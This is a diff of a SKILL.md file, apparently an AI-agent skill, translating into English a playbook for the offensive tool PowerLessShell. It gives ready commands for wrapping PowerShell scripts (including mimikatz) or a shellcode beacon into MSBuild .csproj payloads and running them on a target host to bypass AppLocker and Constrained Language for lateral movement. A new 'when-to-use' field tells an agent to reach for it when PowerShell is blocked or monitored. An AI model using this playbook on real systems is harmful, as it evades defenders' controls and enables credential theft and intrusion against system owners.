@@ -2,37 +2,41 @@
 name: powerlessshell-nolimits
 description: "Execute without powershell.exe. Signals: lateral movement, psexec, shellcode mode."
 zh-signals: "PowerLessShell: 无 powershell.exe 执行。信号:横向移动,psexec,shellcode 模式。"
+when-to-use: >-
+  Use when PowerShell execution is blocked or monitored and you need to run
+  PowerShell or shellcode through MSBuild.exe. Generates a .csproj payload
+  from a script or shellcode file.
 ---
 
 # PowerLessShell
 
-- 攻击大类:C31 远程服务横向移动
-- 上游仓库:https://github.com/Mr-Un1k0d3r/PowerLessShell
-- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C31 Remote Service Lateral Movement
+- Upstream Repository: https://github.com/Mr-Un1k0d3r/PowerLessShell
+- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/Mr-Un1k0d3r/PowerLessShell
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `python PowerLessShell.py -type powershell -source enum.ps1 -output run.csproj` | 生成 MSBuild 载荷 |
-| `目标机: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe run.csproj` | 执行 |
-| `-type shellcode -source beacon.bin` | shellcode 模式 |
+| `python PowerLessShell.py -type powershell -source enum.ps1 -output run.csproj` | Generate MSBuild payload |
+| `target host: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe run.csproj` | Execute |
+| `-type shellcode -source beacon.bin` | Shellcode mode |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### 无 powershell.exe 执行
+### Execution without powershell.exe
 
 ```bash
 python PowerLessShell.py -type powershell -source mimikatz.ps1 -o m.csproj
-# MSBuild.exe 白名单进程执行,绕过限制
+# Executes through the allow-listed MSBuild.exe process to bypass restrictions
 ```
 
-## 注意事项
+## Notes
 
-把 PowerShell 转成 MSBuild .csproj 执行,Constrained Language/AppLocker 环境的经典绕过。
+Converts PowerShell into an MSBuild .csproj for execution, a classic bypass in Constrained Language/AppLocker environments.
